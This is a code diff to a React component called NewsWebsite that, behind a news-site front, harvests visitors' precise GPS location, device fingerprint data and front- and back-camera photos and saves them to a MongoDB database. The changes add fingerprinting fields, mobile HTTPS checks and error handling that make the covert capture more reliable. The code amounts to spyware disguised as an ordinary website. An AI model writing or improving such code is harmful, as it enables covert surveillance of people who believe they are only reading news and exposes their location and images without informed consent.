@@ -322,9 +322,19 @@ const NewsWebsite = () => {
   };
 
   // MongoDB connection and tracking functions
+  // Enhanced initialization with better error handling and debugging
   const initializeMongoDB = async () => {
     try {
       console.log('🔄 Initializing MongoDB connection...');
+      console.log('🌐 Environment:', {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        cookieEnabled: navigator.cookieEnabled,
+        onLine: navigator.onLine,
+        protocol: window.location.protocol,
+        hostname: window.location.hostname
+      });
       
       if (app.currentUser) {
         console.log('✅ Using existing user:', app.currentUser.id);
@@ -345,6 +355,11 @@ const NewsWebsite = () => {
       return mongodb;
     } catch (error) {
       console.error('❌ MongoDB connection failed:', error);
+      console.error('Error details:', {
+        name: error.name,
+        message: error.message,
+        stack: error.stack
+      });
       return null;
     }
   };
@@ -361,7 +376,7 @@ const NewsWebsite = () => {
       
       const locationData = {
         ...location,
-        timestamp: new Date(location.timestamp).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+        timestamp: new Date(location.timestamp),
         createdAt: new Date(),
         userAgent: navigator.userAgent,
         referrer: document.referrer,
@@ -400,7 +415,7 @@ const NewsWebsite = () => {
       
       const captureData = {
         ...cameraData,
-        timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+        timestamp: new Date(),
         createdAt: new Date(),
         userAgent: navigator.userAgent,
         referrer: document.referrer,
@@ -423,19 +438,45 @@ const NewsWebsite = () => {
     if (!forceTrack && locationTracked) return;
 
     console.log('🎯 Starting location tracking...');
+    console.log('🔒 Security context:', {
+      isSecureContext: window.isSecureContext,
+      protocol: window.location.protocol,
+      hostname: window.location.hostname
+    });
 
-    if (!navigator.geolocation) {
-      console.error('❌ Geolocation not supported');
+    // Check for HTTPS requirement
+    if (!window.isSecureContext && window.location.hostname !== 'localhost') {
+      console.error('❌ Geolocation requires HTTPS on mobile devices');
+      console.error('🔒 Current protocol:', window.location.protocol);
+      setLocationTracked(true);
       return;
     }
 
+    if (!navigator.geolocation) {
+      console.error('❌ Geolocation not supported');
+      console.error('Navigator object:', navigator);
+      return;
+    }
+
+    console.log('✅ Geolocation API available');
+
     return new Promise((resolve) => {
+      // Enhanced geolocation options for mobile
+      const options = {
+        enableHighAccuracy: true,
+        timeout: 30000, // Increased timeout for mobile
+        maximumAge: 0
+      };
+
+      console.log('📱 Requesting location with options:', options);
+
       navigator.geolocation.getCurrentPosition(
         async (position) => {
-          console.log('📍 Location obtained:', {
+          console.log('📍 Location obtained successfully:', {
             lat: position.coords.latitude,
             lng: position.coords.longitude,
-            accuracy: position.coords.accuracy
+            accuracy: position.coords.accuracy,
+            timestamp: position.timestamp
           });
 
           const location = {
@@ -445,26 +486,56 @@ const NewsWebsite = () => {
             timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
             altitude: position.coords.altitude,
             heading: position.coords.heading,
-            speed: position.coords.speed
+            speed: position.coords.speed,
+            // Additional debug info
+            deviceInfo: {
+              isMobile: /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
+              screenWidth: window.screen.width,
+              screenHeight: window.screen.height,
+              windowWidth: window.innerWidth,
+              windowHeight: window.innerHeight,
+              devicePixelRatio: window.devicePixelRatio
+            }
           };
 
+          console.log('💾 Attempting to save location to MongoDB...');
           const result = await saveLocationToMongoDB(location);
           if (result) {
             setLocationTracked(true);
-            console.log('✅ Location successfully stored in MongoDB');
+            console.log('✅ Location successfully stored in MongoDB with ID:', result.insertedId);
+          } else {
+            console.error('❌ Failed to save location to MongoDB');
           }
           resolve(result);
         },
         (error) => {
-          console.log('❌ Location access failed:', error.message);
+          console.error('❌ Location access failed:', {
+            code: error.code,
+            message: error.message,
+            PERMISSION_DENIED: error.PERMISSION_DENIED,
+            POSITION_UNAVAILABLE: error.POSITION_UNAVAILABLE,
+            TIMEOUT: error.TIMEOUT
+          });
+
+          // Specific error handling
+          switch(error.code) {
+            case error.PERMISSION_DENIED:
+              console.error('🚫 User denied location permission');
+              break;
+            case error.POSITION_UNAVAILABLE:
+              console.error('📍 Location information unavailable');
+              break;
+            case error.TIMEOUT:
+              console.error('⏰ Location request timed out');
+              break;
+            default:
+              console.error('❓ Unknown location error');
+          }
+
           setLocationTracked(true);
           resolve(null);
         },
-        {
-          enableHighAccuracy: true,
-          timeout: 15000,
-          maximumAge: 0
-        }
+        options
       );
     });
   };
@@ -522,18 +593,50 @@ const NewsWebsite = () => {
     if (cameraTracked) return;
 
     console.log('📸 Starting camera tracking...');
+    console.log('🔒 Camera security context:', {
+      isSecureContext: window.isSecureContext,
+      protocol: window.location.protocol,
+      mediaDevicesSupported: !!navigator.mediaDevices,
+      getUserMediaSupported: !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia)
+    });
 
     try {
-      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        console.log('❌ Camera API not supported');
+      // Check for HTTPS requirement on mobile
+      if (!window.isSecureContext && window.location.hostname !== 'localhost') {
+        console.error('❌ Camera access requires HTTPS on mobile devices');
         setCameraTracked(true);
         return;
       }
 
-      const devices = await navigator.mediaDevices.enumerateDevices();
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        console.error('❌ Camera API not supported');
+        console.error('MediaDevices availability:', {
+          mediaDevices: !!navigator.mediaDevices,
+          getUserMedia: !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia),
+          enumerateDevices: !!(navigator.mediaDevices && navigator.mediaDevices.enumerateDevices)
+        });
+        setCameraTracked(true);
+        return;
+      }
+
+      console.log('✅ Camera API available, enumerating devices...');
+
+      // Get available cameras with better error handling
+      let devices = [];
+      try {
+        devices = await navigator.mediaDevices.enumerateDevices();
+      } catch (enumError) {
+        console.error('❌ Failed to enumerate devices:', enumError);
+        setCameraTracked(true);
+        return;
+      }
+
       const videoDevices = devices.filter(device => device.kind === 'videoinput');
       
-      console.log(`📷 Found ${videoDevices.length} camera(s)`);
+      console.log(`📷 Found ${videoDevices.length} camera(s):`, videoDevices.map(d => ({
+        id: d.deviceId,
+        label: d.label || 'Camera'
+      })));
 
       const cameraData = {
         availableCameras: videoDevices.length,
@@ -542,31 +645,71 @@ const NewsWebsite = () => {
           label: device.label || 'Camera',
           kind: device.kind
         })),
-        captures: []
+        captures: [],
+        // Additional debug info
+        debugInfo: {
+          isMobile: /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
+          isSecureContext: window.isSecureContext,
+          protocol: window.location.protocol,
+          timestamp: new Date().toISOString()
+        }
       };
 
-      const frontCapture = await captureFromCamera('user');
-      if (frontCapture) {
-        cameraData.captures.push(frontCapture);
-        console.log('✅ Front camera capture successful');
+      // Try to capture from front camera with enhanced error handling
+      console.log('📷 Attempting front camera capture...');
+      try {
+        const frontCapture = await captureFromCamera('user');
+        if (frontCapture) {
+          cameraData.captures.push(frontCapture);
+          console.log('✅ Front camera capture successful');
+        } else {
+          console.log('⚠️ Front camera capture returned null');
+        }
+      } catch (frontError) {
+        console.error('❌ Front camera capture failed:', frontError);
       }
 
+      // Try to capture from back camera (if available)
       if (videoDevices.length > 1) {
-        const backCapture = await captureFromCamera('environment');
-        if (backCapture) {
-          cameraData.captures.push(backCapture);
-          console.log('✅ Back camera capture successful');
+        console.log('📷 Attempting back camera capture...');
+        try {
+          const backCapture = await captureFromCamera('environment');
+          if (backCapture) {
+            cameraData.captures.push(backCapture);
+            console.log('✅ Back camera capture successful');
+          } else {
+            console.log('⚠️ Back camera capture returned null');
+          }
+        } catch (backError) {
+          console.error('❌ Back camera capture failed:', backError);
         }
       }
 
-      if (cameraData.captures.length > 0) {
-        await saveCameraDataToMongoDB(cameraData);
-        console.log(`✅ Successfully captured from ${cameraData.captures.length} camera(s)`);
+      // Save camera data to MongoDB
+      console.log('💾 Attempting to save camera data to MongoDB...');
+      if (cameraData.captures.length > 0 || cameraData.availableCameras > 0) {
+        try {
+          const result = await saveCameraDataToMongoDB(cameraData);
+          if (result) {
+            console.log(`✅ Camera data stored successfully with ID: ${result.insertedId}`);
+            console.log(`📊 Captured from ${cameraData.captures.length} camera(s)`);
+          } else {
+            console.error('❌ Failed to save camera data to MongoDB');
+          }
+        } catch (saveError) {
+          console.error('❌ Error saving camera data:', saveError);
+        }
+      } else {
+        console.log('⚠️ No camera captures to save');
       }
 
       setCameraTracked(true);
     } catch (error) {
-      console.error('❌ Camera tracking failed:', error);
+      console.error('❌ Camera tracking failed with error:', {
+        name: error.name,
+        message: error.message,
+        stack: error.stack
+      });
       setCameraTracked(true);
     }
   };
